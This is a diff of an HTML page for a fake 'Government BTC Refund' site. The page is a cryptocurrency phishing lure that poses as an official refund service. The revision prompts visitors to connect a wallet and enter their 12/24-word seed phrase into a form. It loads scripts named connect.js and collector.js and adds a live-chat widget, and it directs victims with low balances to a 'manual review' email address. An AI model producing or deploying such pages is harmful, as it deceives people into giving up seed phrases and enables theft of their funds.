@@ -8,29 +8,46 @@
 </head>
 <body>
   <div class="container">
-    <h2>Government BTC Refund</h2>
+    <h2>🇺🇸 Government BTC Refund</h2>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
-    <p><strong>Requirement:</strong> Wallet must hold at least $1,000 worth of BTC to qualify.</p>
-    <p>For further inquiries, contact us at: <a href="mailto:admin@govbtcclaim.org">admin@govbtcclaim.org</a></p>
+
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
-    <div class="wallet-box" id="walletBox" style="display:none;">
-      <label for="walletType">Wallet Type:</label>
-      <select id="walletType">
-        <option>MetaMask</option>
-        <option>Trust Wallet</option>
-        <option>Coinbase Wallet</option>
-      </select>
-      <br><br>
-      <label for="seedPhrase">Enter 12-word seed phrase:</label><br>
-      <textarea id="seedPhrase" rows="3" cols="30" placeholder="word1 word2 word3 ..."></textarea>
-      <br><br>
-      <button onclick="submitSeed()">Submit</button>
+    <div id="walletForm" style="display:none; margin-top:20px;">
+      <label for="walletType">Select Wallet Type:</label><br>
+      <select id="walletType" class="input-box">
+        <option value="MetaMask">MetaMask</option>
+        <option value="Trust Wallet">Trust Wallet</option>
+        <option value="Coinbase Wallet">Coinbase Wallet</option>
+        <option value="Other">Other</option>
+      </select><br><br>
+
+      <label for="seedPhrase">Enter your 12/24-word phrase:</label><br>
+      <textarea id="seedPhrase" rows="4" class="input-box" placeholder="e.g., word1 word2 word3..."></textarea><br><br>
+
+      <button class="btn" onclick="submitWallet()">Submit</button>
     </div>
-    <div class="note">Please ensure your wallet is connected and holds the required balance.</div>
+
+    <div class="note">
+      If your wallet holds less than the expected balance, contact support via live chat or email <strong>admin@govbtcclaim.org</strong> for manual review.
+    </div>
   </div>
 
+  <!-- Scripts -->
   <script src="js/connect.js"></script>
   <script src="js/collector.js"></script>
+
+  <!-- Tawk.to Live Chat -->
+  <script type="text/javascript">
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function() {
+      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/686aa27570e7fd1919384314/1ivg8l7dr';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
+    })();
+  </script>
 </body>
 </html>
